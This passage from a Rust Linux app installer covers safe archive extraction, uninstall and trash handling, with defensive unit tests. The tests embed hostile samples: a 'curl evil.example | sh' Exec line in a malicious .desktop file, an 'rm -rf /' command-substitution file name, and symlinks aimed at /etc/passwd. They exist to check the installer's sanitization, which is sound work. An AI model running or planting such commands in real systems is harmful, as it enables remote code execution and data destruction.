                return Err(sevenz_rust::Error::other(format!(
                    "archive exceeds maximum entry limit ({})",
                    crate::detect::MAX_ARCHIVE_ENTRIES
                )));
            }
            let rel = PathBuf::from(entry.name());
            if rel.as_os_str().is_empty() || rel == Path::new(".") || rel == Path::new("./") {
                return Ok(true);
            }
            let dest =
                safe_join(dest_root, &rel).map_err(|e| sevenz_rust::Error::other(e.to_string()))?;
            if entry.is_directory() {
                fs::create_dir_all(&dest)?;
            } else {
                if let Some(parent) = dest.parent() {
                    fs::create_dir_all(parent)?;
                }
                copy_limited(data, &dest, &mut total)
                    .map_err(|e| sevenz_rust::Error::other(e.to_string()))?;
            }
            Ok(true)
        })
        .map_err(|e| EasiError::Archive(e.to_string()))?;
    Ok(())
}

fn snapshot_files(roots: &[PathBuf]) -> std::collections::HashSet<PathBuf> {
    let mut out = std::collections::HashSet::new();
    for root in roots {
        collect_files_recursive(root, &mut out);
    }
    out
}

fn collect_files_recursive(dir: &Path, out: &mut std::collections::HashSet<PathBuf>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if let Ok(meta) = fs::symlink_metadata(&p) {
            if meta.file_type().is_dir() {
                collect_files_recursive(&p, out);
            } else {
                out.insert(p);
            }
        }
    }
}

/// Verify that a relative symlink at `entry_rel` pointing to `target` stays strictly inside the
/// archive extraction root. Allows safe internal relative symlinks (e.g. `share/terminfo/1/foo -> ../a/bar`
/// or `bin/tool -> ../lib/tool/tool`) while blocking absolute targets and any `..` that escapes root.
pub fn is_safe_archive_symlink(entry_rel: &Path, target: &Path) -> bool {
    if target.is_absolute() {
        return false;
    }
    let mut stack: Vec<std::ffi::OsString> = Vec::new();
    if let Some(parent) = entry_rel.parent() {
        for comp in parent.components() {
            match comp {
                std::path::Component::Normal(p) => stack.push(p.to_os_string()),
                std::path::Component::CurDir => {}
                std::path::Component::ParentDir
                | std::path::Component::RootDir
                | std::path::Component::Prefix(_) => return false,
            }
        }
    }
    for comp in target.components() {
        match comp {
            std::path::Component::Normal(p) => stack.push(p.to_os_string()),
            std::path::Component::CurDir => {}
            std::path::Component::ParentDir => {
                if stack.pop().is_none() {
                    return false;
                }
            }
            std::path::Component::RootDir | std::path::Component::Prefix(_) => return false,
        }
    }
    !stack.is_empty()
}

fn extract_tar_safe<R: Read>(reader: R, dest_root: &Path) -> Result<(), EasiError> {
    let mut archive = Archive::new(reader);
    let entries = archive
        .entries()
        .map_err(|e| EasiError::Archive(e.to_string()))?;

    let mut total = 0u64;
    let mut count = 0usize;
    for item in entries {
        count += 1;
        if count > crate::detect::MAX_ARCHIVE_ENTRIES {
            return Err(EasiError::Archive(format!(
                "archive exceeds maximum entry limit ({})",
                crate::detect::MAX_ARCHIVE_ENTRIES
            )));
        }
        let mut entry = item.map_err(|e| EasiError::Archive(e.to_string()))?;
        let rel = entry
            .path()
            .map_err(|e| EasiError::Archive(e.to_string()))?
            .into_owned();
        if rel.as_os_str().is_empty() || rel == Path::new(".") {
            continue;
        }
        let dest = safe_join(dest_root, &rel)?;
        let header = entry.header();
        let mode = header.mode().unwrap_or(0o644) & !0o6000;
        let etype = header.entry_type();

        if etype.is_dir() {
            fs::create_dir_all(&dest)?;
        } else if etype.is_symlink() {
            if let Some(target) = entry.link_name().ok().flatten() {
                if !is_safe_archive_symlink(&rel, target.as_ref()) {
                    return Err(EasiError::PathEscape(target.to_string_lossy().into_owned()));
                }
                if let Some(parent) = dest.parent() {
                    fs::create_dir_all(parent)?;
                }
                if dest.symlink_metadata().is_ok() {
                    let _ = fs::remove_file(&dest);
                }
                symlink(target.as_ref(), &dest)?;
            }
        } else if etype.is_file() {
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }
            copy_limited(&mut entry, &dest, &mut total)?;
            fs::set_permissions(&dest, fs::Permissions::from_mode(mode))?;
        }
    }
    Ok(())
}

fn extract_zip_safe(path: &Path, dest_root: &Path) -> Result<(), EasiError> {
    let file = File::open(path)?;
    let mut zip =
        ZipArchive::new(BufReader::new(file)).map_err(|e| EasiError::Archive(e.to_string()))?;
    if zip.len() > crate::detect::MAX_ARCHIVE_ENTRIES {
        return Err(EasiError::Archive(format!(
            "archive exceeds maximum entry limit ({})",
            crate::detect::MAX_ARCHIVE_ENTRIES
        )));
    }

    let mut total = 0u64;
    for i in 0..zip.len() {
        let mut entry = zip
            .by_index(i)
            .map_err(|e| EasiError::Archive(e.to_string()))?;
        let rel = PathBuf::from(entry.name());
        if rel.as_os_str().is_empty() || rel == Path::new(".") || rel == Path::new("./") {
            continue;
        }
        let dest = safe_join(dest_root, &rel)?;
        let mode = entry.unix_mode().unwrap_or(0o644) & !0o6000;

        if entry.is_dir() {
            fs::create_dir_all(&dest)?;
        } else if (mode & 0o170000) == 0o120000 {
            let mut target = String::new();
            entry.read_to_string(&mut target)?;
            let target_path = Path::new(&target);
            if !is_safe_archive_symlink(&rel, target_path) {
                return Err(EasiError::PathEscape(target));
            }
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }
            if dest.symlink_metadata().is_ok() {
                let _ = fs::remove_file(&dest);
            }
            symlink(target_path, &dest)?;
        } else {
            if let Some(parent) = dest.parent() {
                fs::create_dir_all(parent)?;
            }
            copy_limited(&mut entry, &dest, &mut total)?;
            fs::set_permissions(&dest, fs::Permissions::from_mode(mode & 0o777))?;
        }
    }
    Ok(())
}

fn copy_tree_recorded(src: &Path, dst: &Path, tx: &mut Transaction) -> Result<(), EasiError> {
    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dst_path = dst.join(entry.file_name());
        let meta = fs::symlink_metadata(&src_path)?;
        if meta.file_type().is_symlink() {
            let target = fs::read_link(&src_path)?;
            symlink(target, &dst_path)?;
            tx.record_file(dst_path);
        } else if meta.is_dir() {
            fs::create_dir_all(&dst_path)?;
            tx.record_dir(dst_path.clone());
            copy_tree_recorded(&src_path, &dst_path, tx)?;
        } else {
            fs::copy(&src_path, &dst_path)?;
            let mut perms = meta.permissions();
            perms.set_mode(perms.mode() & !0o6000);
            fs::set_permissions(&dst_path, perms)?;
            tx.record_file(dst_path);
        }
    }
    Ok(())
}

pub fn refresh_desktop_caches(roots: &InstallRoots) {
    let de = std::env::var("XDG_CURRENT_DESKTOP").unwrap_or_default();
    let quirk = detect_de_quirk(&de);

    if quirk.refresh_desktop_db && roots.desktop_dir.exists() {
        let _ = Command::new("update-desktop-database")
            .arg(&roots.desktop_dir)
            .output();
    }
    if quirk.refresh_gtk_icon_cache && roots.icons_dir.exists() {
        let _ = Command::new("gtk-update-icon-cache")
            .args(["-f", "-t"])
            .arg(&roots.icons_dir)
            .output();
    }
    if quirk.refresh_kde_sycoca {
        let _ = Command::new("kbuildsycoca6")
            .output()
            .or_else(|_| Command::new("kbuildsycoca5").output());
    }
    // Keep SELinux contexts clean on Fedora/RHEL/Silverblue/Bazzite (no-op elsewhere).
    if roots.applications_dir.exists() {
        let _ = Command::new("restorecon")
            .args(["-RF"])
            .arg(&roots.applications_dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status();
    }
}

fn candidate_xdg_names(manifest: &Manifest) -> Vec<String> {
    let bare_id = manifest
        .app_id
        .strip_prefix("easi.")
        .unwrap_or(&manifest.app_id);
    let last_seg = bare_id.split('.').next_back().unwrap_or(bare_id);
    let mut names = vec![
        manifest.app_id.clone(),
        bare_id.to_string(),
        last_seg.to_string(),
        manifest.name.clone(),
        manifest.name.to_ascii_lowercase(),
    ];
    names.sort();
    names.dedup();
    names
}

fn find_matching_dirs(bases: &[PathBuf], manifest: &Manifest) -> Vec<PathBuf> {
    let names = candidate_xdg_names(manifest);
    let mut found = Vec::new();
    for base in bases {
        for name in &names {
            if name.is_empty()
                || name == "easi"
                || name == "applications"
                || name == "icons"
                || name == "Trash"
                || name.contains('/')
                || name.contains("..")
            {
                continue;
            }
            let cand = base.join(name);
            if cand.is_dir() && !found.contains(&cand) {
                found.push(cand);
            }
        }
    }
    found
}

/// Find per-user cache directories (`~/.cache/<slug>`) for an installed app.
pub fn find_app_cache_dirs(roots: &InstallRoots, manifest: &Manifest) -> Vec<PathBuf> {
    find_matching_dirs(&[roots.home_dir.join(".cache")], manifest)
}

/// Find per-user settings/data directories (`~/.config/<slug>`, `~/.local/share/<slug>`).
pub fn find_app_user_data_dirs(roots: &InstallRoots, manifest: &Manifest) -> Vec<PathBuf> {
    find_matching_dirs(
        &[
            roots.home_dir.join(".config"),
            roots.home_dir.join(".local/share"),
        ],
        manifest,
    )
}

/// Find all likely per-user XDG settings/cache/data directories created by an installed app.
pub fn find_app_data_dirs(roots: &InstallRoots, manifest: &Manifest) -> Vec<PathBuf> {
    let mut all = find_app_user_data_dirs(roots, manifest);
    all.extend(find_app_cache_dirs(roots, manifest));
    all
}

/// Clear only the `~/.cache/<slug>` directories for an installed app. Returns freed bytes.
pub fn clear_app_cache(roots: &InstallRoots, query: &str) -> Result<u64, EasiError> {
    let manifest = resolve_installed(roots, query)?;
    let dirs = find_app_cache_dirs(roots, &manifest);
    let mut freed = 0u64;
    for dir in dirs {
        freed = freed.saturating_add(crate::manifest::dir_size_bytes(&dir));
        let _ = fs::remove_dir_all(&dir);
    }
    Ok(freed)
}

/// Clear `~/.config/<slug>` and `~/.local/share/<slug>` user data for an installed app.
pub fn clear_app_user_data(roots: &InstallRoots, query: &str) -> Result<u64, EasiError> {
    let manifest = resolve_installed(roots, query)?;
    let dirs = find_app_user_data_dirs(roots, &manifest);
    let mut freed = 0u64;
    for dir in dirs {
        freed = freed.saturating_add(crate::manifest::dir_size_bytes(&dir));
        let _ = fs::remove_dir_all(&dir);
    }
    Ok(freed)
}

/// Replay manifest in reverse and remove the manifest file.
/// Reconciles first so any files added by an app's own self-updater inside `install_dir`
/// are also cleaned up.
pub fn uninstall_app(roots: &InstallRoots, query: &str) -> Result<Manifest, EasiError> {
    uninstall_app_with_options(roots, query, false)
}

/// Uninstall an app, optionally purging its XDG config/cache/data directories when `purge_data` is true.
pub fn uninstall_app_with_options(
    roots: &InstallRoots,
    query: &str,
    purge_data: bool,
) -> Result<Manifest, EasiError> {
    let mut manifest = resolve_installed(roots, query)?;
    let _ = crate::reconcile::reconcile_manifest(roots, &mut manifest);
    let data_dirs = if purge_data {
        find_app_data_dirs(roots, &manifest)
    } else {
        vec![]
    };
    let safe_files: Vec<PathBuf> = manifest
        .created_files
        .iter()
        .filter(|p| roots.is_within_allowed_write_roots(p))
        .cloned()
        .collect();
    let safe_dirs: Vec<PathBuf> = manifest
        .created_dirs
        .iter()
        .filter(|p| roots.is_within_allowed_write_roots(p))
        .cloned()
        .collect();
    rollback_paths(&safe_files, &safe_dirs);
    for dir in data_dirs {
        let _ = fs::remove_dir_all(dir);
    }
    delete_manifest(roots, &manifest.app_id)?;
    refresh_desktop_caches(roots);
    Ok(manifest)
}

/// Move a file to the XDG Trash (FreeDesktop Trash spec 1.0).
pub fn move_to_trash(roots: &InstallRoots, source: &Path) -> Result<PathBuf, EasiError> {
    if !source.exists() {
        return Err(EasiError::NotFound(source.to_path_buf()));
    }
    let files_dir = roots.trash_dir.join("files");
    let info_dir = roots.trash_dir.join("info");
    fs::create_dir_all(&files_dir)?;
    fs::create_dir_all(&info_dir)?;

    let orig_name = source
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".into());

    let mut candidate = orig_name.clone();
    let mut counter = 1u32;
    while files_dir.join(&candidate).exists()
        || info_dir.join(format!("{candidate}.trashinfo")).exists()
    {
        candidate = format!("{orig_name}.{counter}");
        counter += 1;
    }

    let dest = files_dir.join(&candidate);
    let info_path = info_dir.join(format!("{candidate}.trashinfo"));
    let abs_source = fs::canonicalize(source).unwrap_or_else(|_| source.to_path_buf());
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let info_content = format!(
        "[Trash Info]\nPath={}\nDeletionDate={secs}\n",
        abs_source.to_string_lossy()
    );
    fs::write(&info_path, info_content)?;

    if fs::rename(source, &dest).is_err() {
        fs::copy(source, &dest)?;
        fs::remove_file(source)?;
    }
    Ok(dest)
}

pub fn is_bin_dir_on_path(bin_dir: &Path) -> bool {
    let Some(path_var) = std::env::var_os("PATH") else {
        return false;
    };
    let canon_bin = fs::canonicalize(bin_dir).ok();
    std::env::split_paths(&path_var).any(|p| {
        p == bin_dir
            || canon_bin
                .as_ref()
                .zip(fs::canonicalize(&p).ok())
                .is_some_and(|(a, b)| a == &b)
    })
}

/// Append `~/.local/bin` to the user's shell rc file (idempotent).
pub fn add_bin_to_shell_rc(home: &Path) -> Result<PathBuf, EasiError> {
    let shell = std::env::var("SHELL").unwrap_or_default();
    let rc_name = if shell.ends_with("zsh") {
        ".zshrc"
    } else if shell.ends_with("bash") {
        ".bashrc"
    } else {
        ".profile"
    };
    let rc_path = home.join(rc_name);
    let line = "export PATH=\"$HOME/.local/bin:$PATH\"";
    let existing = fs::read_to_string(&rc_path).unwrap_or_default();
    if !existing.contains(".local/bin") {
        let mut next = existing;
        if !next.is_empty() && !next.ends_with('\n') {
            next.push('\n');
        }
        next.push_str("# Added by easi\n");
        next.push_str(line);
        next.push('\n');
        fs::write(&rc_path, next)?;
    }
    Ok(rc_path)
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use flate2::Compression;
    use flate2::write::GzEncoder;

    use super::*;
    use crate::inspect::classify_package;
    use crate::manifest::list_manifests;
    use crate::model::Classified;

    fn make_gui_tarball(dir: &Path, filename: &str) -> PathBuf {
        let path = dir.join(filename);
        let file = File::create(&path).expect("create tar.gz");
        let enc = GzEncoder::new(file, Compression::fast());
        let mut builder = tar::Builder::new(enc);
        let files: &[(&str, &[u8], u32)] = &[
            ("CoolApp/bin/coolapp", b"\x7fELF\x02\x01\x01\x00", 0o4755), // includes setuid to verify strip
            (
                "CoolApp/coolapp.desktop",
                b"[Desktop Entry]\nName=Cool App\nExec=coolapp\nIcon=coolapp\n",
                0o644,
            ),
            ("CoolApp/icons/256x256/coolapp.png", b"\x89PNG\r\n", 0o644),
        ];
        for (rel, data, mode) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(data.len() as u64);
            header.set_mode(*mode);
            header.set_cksum();
            builder
                .append_data(&mut header, *rel, *data)
                .expect("append");
        }
        builder
            .into_inner()
            .expect("inner")
            .finish()
            .expect("finish");
        path
    }

    #[test]
    fn install_replace_uninstall_and_trash_against_temp_root() {
        let tmp = TempDir::new().expect("tempdir");
        let roots = InstallRoots::from_home(tmp.path());
        let dl_dir = tmp.path().join("Downloads");
        fs::create_dir_all(&dl_dir).expect("mkdir downloads");

        let pkg_v1 = make_gui_tarball(&dl_dir, "CoolApp-1.0.0.tar.gz");
        let Classified::Ready { plan, .. } = classify_package(&pkg_v1, |_| None).expect("classify")
        else {
            panic!("expected Ready");
        };

        let cancel = AtomicBool::new(false);
        let summary = execute_install(&roots, &plan, false, &cancel, |_, _| {}).expect("install");
        assert_eq!(summary.app_id, "coolapp");

        // Verify installed binary has setuid stripped and single top-level dir was stripped!
        let bin_file = summary.install_dir.join("bin/coolapp");
        assert!(bin_file.exists());
        let mode = fs::metadata(&bin_file).expect("meta").permissions().mode();
        assert_eq!(mode & 0o6000, 0, "setuid/setgid must be stripped");

        // Verify .desktop, icon, symlink, and manifest exist.
        let desktop = roots.desktop_dir.join("coolapp.desktop");
        assert!(desktop.exists());
        let desktop_text = fs::read_to_string(&desktop).expect("read desktop");
        assert!(desktop_text.contains("bin/coolapp"));
        assert!(roots.icons_dir.join("256x256/apps/coolapp.png").exists());
        assert!(roots.bin_dir.join("coolapp").symlink_metadata().is_ok());
        assert_eq!(list_manifests(&roots).expect("list").len(), 1);

        // Re-drop detects conflict and replace succeeds.
        let pkg_v2 = make_gui_tarball(&dl_dir, "CoolApp-2.0.0.tar.gz");
        let classified_v2 = classify_package(&pkg_v2, |id| {
            find_manifest_by_id(&roots, id).map(|m| m.to_installed_app())
        })
        .expect("classify v2");
        let Classified::Conflict {
            existing,
            plan: plan_v2,
            ..
        } = classified_v2
        else {
            panic!("expected Conflict");
        };
        assert_eq!(existing.version.as_deref(), Some("1.0.0"));
        let summary_v2 =
            execute_install(&roots, &plan_v2, true, &cancel, |_, _| {}).expect("replace");
        assert_eq!(summary_v2.version.as_deref(), Some("2.0.0"));

        // Move source to Trash.
        let trashed = move_to_trash(&roots, &pkg_v2).expect("trash");
        assert!(trashed.exists());
        assert!(!pkg_v2.exists());

        // Uninstall replays manifest cleanly.
        uninstall_app(&roots, "coolapp").expect("uninstall");
        assert!(!desktop.exists());
        assert!(!bin_file.exists());
        assert!(roots.bin_dir.join("coolapp").symlink_metadata().is_err());
        assert!(list_manifests(&roots).expect("list").is_empty());
    }

    #[test]
    fn parses_noexec_mount_points_accurately() {
        let mounts = "\
/dev/sda1 / ext4 rw,relatime 0 0\n\
/dev/sda2 /home ext4 rw,nosuid,nodev,noexec 0 0\n\
/dev/sda3 /home/user/Applications ext4 rw,relatime 0 0\n";
        assert!(!parse_noexec_from_mounts(mounts, Path::new("/opt/app")));
        assert!(parse_noexec_from_mounts(
            mounts,
            Path::new("/home/other/Applications")
        ));
        assert!(!parse_noexec_from_mounts(
            mounts,
            Path::new("/home/user/Applications/Foo")
        ));
    }

    #[test]
    fn atomic_replace_restores_old_app_on_cancel() {
        let tmp = TempDir::new().expect("tempdir");
        let roots = InstallRoots::from_home(tmp.path());
        let dl_dir = tmp.path().join("Downloads");
        fs::create_dir_all(&dl_dir).expect("mkdir");

        let pkg_v1 = make_gui_tarball(&dl_dir, "CoolApp-1.0.0.tar.gz");
        let Classified::Ready { plan: plan_v1, .. } =
            classify_package(&pkg_v1, |_| None).expect("classify v1")
        else {
            panic!("expected Ready");
        };
        let cancel = AtomicBool::new(false);
        let s1 = execute_install(&roots, &plan_v1, false, &cancel, |_, _| {}).expect("install v1");
        let marker = s1.install_dir.join("v1_marker.txt");
        fs::write(&marker, "still-here").expect("write marker");

        // Attempt replace with cancel already set -> must fail AND restore v1 cleanly!
        let pkg_v2 = make_gui_tarball(&dl_dir, "CoolApp-2.0.0.tar.gz");
        let Classified::Conflict { plan: plan_v2, .. } = classify_package(&pkg_v2, |id| {
            find_manifest_by_id(&roots, id).map(|m| m.to_installed_app())
        })
        .expect("classify v2") else {
            panic!("expected Conflict");
        };
        let cancelled = AtomicBool::new(true);
        assert!(execute_install(&roots, &plan_v2, true, &cancelled, |_, _| {}).is_err());

        assert!(
            marker.exists(),
            "v1 install dir must be restored on failed replace"
        );
        assert!(
            roots.desktop_dir.join("coolapp.desktop").exists(),
            "v1 .desktop must be restored on failed replace"
        );
        let m = find_manifest_by_id(&roots, "coolapp").expect("v1 manifest must remain");
        assert_eq!(m.version.as_deref(), Some("1.0.0"));

        // Verify clear_app_cache removes only ~/.cache/coolapp and leaves ~/.config/coolapp intact.
        let cache_dir = roots.home_dir.join(".cache/coolapp");
        let config_dir = roots.home_dir.join(".config/coolapp");
        fs::create_dir_all(&cache_dir).expect("mkdir cache");
        fs::create_dir_all(&config_dir).expect("mkdir config");
        fs::write(cache_dir.join("tmp.bin"), b"123456").expect("write cache");
        fs::write(config_dir.join("settings.toml"), b"ok=true").expect("write config");
        let freed = clear_app_cache(&roots, "coolapp").expect("clear cache");
        assert_eq!(freed, 6);
        assert!(!cache_dir.exists());
        assert!(config_dir.exists());
    }

    #[test]
    fn security_shell_single_quote_and_desktop_sanitization() {
        // 1. Shell quoting neutralizes $(), backticks, double quotes, and single quotes.
        assert_eq!(
            shell_single_quote("/tmp/foo$(rm -rf /)`id`'bar'.jar"),
            "'/tmp/foo$(rm -rf /)`id`'\\''bar'\\''.jar'"
        );

        // 2. Untrusted .desktop file with malicious [Desktop Action] and newline injection
        //    must have only safe [Desktop Entry] keys preserved and zero injected Exec lines.
        let evil_desktop = "\
[Desktop Entry]
Name=GoodApp
Comment=Safe comment
Categories=Utility;
Exec=/bin/sh -c 'curl evil.example | sh'
TryExec=/tmp/evil

[Desktop Action evil]
Name=Launch
Exec=/bin/sh -c 'pwned'
";
        let plan = InstallPlan {
            source_path: PathBuf::from("/tmp/goodapp.tar.gz"),
            format: Format::TarGz,
            app_id: "easi.goodapp".into(),
            synthesized_id: true,
            name: "GoodApp\nExec=/tmp/pwn".into(),
            version: Some("1.0".into()),
            kind: crate::model::AppKind::Gui,
            main_exec: "bin/goodapp".into(),
            icon_path: None,
            icon_bytes: None,
            desktop_entry: Some(evil_desktop.into()),
            startup_wm_class: Some("GoodApp\nExec=/tmp/pwn2".into()),
            developer: None,
            origin_url: None,
            signature_summary: None,
            update_source: None,
            planned_writes: vec![],
        };
        let rendered = render_desktop_entry(
            &plan,
            Path::new("/home/u/Applications/GoodApp/bin/goodapp"),
            Some("easi.goodapp"),
        );
        assert!(!rendered.contains("pwned"));
        assert!(!rendered.contains("\nExec=/tmp/pwn"));
        assert!(!rendered.contains("evil.example"));
        assert!(!rendered.contains("[Desktop Action"));
        assert!(!rendered.contains("TryExec="));
        assert_eq!(
            rendered.lines().filter(|l| l.starts_with("Exec=")).count(),
            1,
            "must emit exactly one trusted Exec= line"
        );

        // 3. Relative archive symlinks: internal `..` stays inside root (allowed);
        //    escaping `..` or absolute targets are blocked!
        assert!(is_safe_archive_symlink(
            Path::new("google-cloud-sdk/platform/python/share/terminfo/1/1178"),
            Path::new("../a/adm1178")
        ));
        assert!(is_safe_archive_symlink(
            Path::new("app/bin/tool"),
            Path::new("../lib/tool/tool")
        ));
        assert!(!is_safe_archive_symlink(
            Path::new("app/bin/tool"),
            Path::new("../../../etc/passwd")
        ));
        assert!(!is_safe_archive_symlink(
            Path::new("app/link"),
            Path::new("../../outside")
        ));
        assert!(!is_safe_archive_symlink(
            Path::new("app/link"),
            Path::new("/etc/passwd")
        ));
    }

    /// Hostile tars that pass the per-entry lexical check but must fail the on-disk pass.
    #[test]
    fn extracted_symlinks_are_resolved_against_the_real_tree() {
        // (name, entries as (path, Some(link target) | None for a dir), must extract)
        type Row = (
            &'static str,
            &'static [(&'static str, Option<&'static str>)],
            bool,
        );
        let rows: &[Row] = &[
            (
                "chained links climb above root",
                &[
                    ("a/b/c/l1", Some("../..")),
                    ("a/b/c/l1/x/y", None),
                    ("a/b/c/l1/x/y/l2", Some("../../../..")),
                ],
                false,
            ),
            (
                "target traverses another link",
                &[("d/e/s", Some("..")), ("d/e/l", Some("s/../.."))],
                false,
            ),
            (
                "symlink loop",
                &[("a/l1", Some("l2")), ("a/l2", Some("l1"))],
                false,
            ),
            (
                "internal relative link",
                &[
                    ("app/lib/tool", None),
                    ("app/bin/tool", Some("../lib/tool")),
                ],
                true,
            ),
        ];
        for (name, entries, ok) in rows {
            let tmp = TempDir::new().expect("tempdir");
            let tar_path = tmp.path().join("hostile.tar");
            let mut builder = tar::Builder::new(File::create(&tar_path).expect("create tar"));
            for (path, target) in *entries {
                let mut header = tar::Header::new_gnu();
                header.set_size(0);
                header.set_mode(0o755);
                match target {
                    Some(t) => {
                        header.set_entry_type(tar::EntryType::Symlink);
                        builder.append_link(&mut header, path, t).expect("link");
                    }
                    None => {
                        header.set_entry_type(tar::EntryType::Directory);
                        builder
                            .append_data(&mut header, path, std::io::empty())
                            .expect("dir");
                    }
                }
            }
            builder.finish().expect("finish");
            let dest = tmp.path().join("out");
            fs::create_dir_all(&dest).expect("mkdir");
            let result = extract_archive_safe(&tar_path, Format::Tar, &dest);
            if *ok {
                assert!(result.is_ok(), "{name}: {result:?}");
            } else {
                assert!(
                    matches!(result, Err(EasiError::PathEscape(_))),
                    "{name}: {result:?}"
                );
            }
        }
    }
}
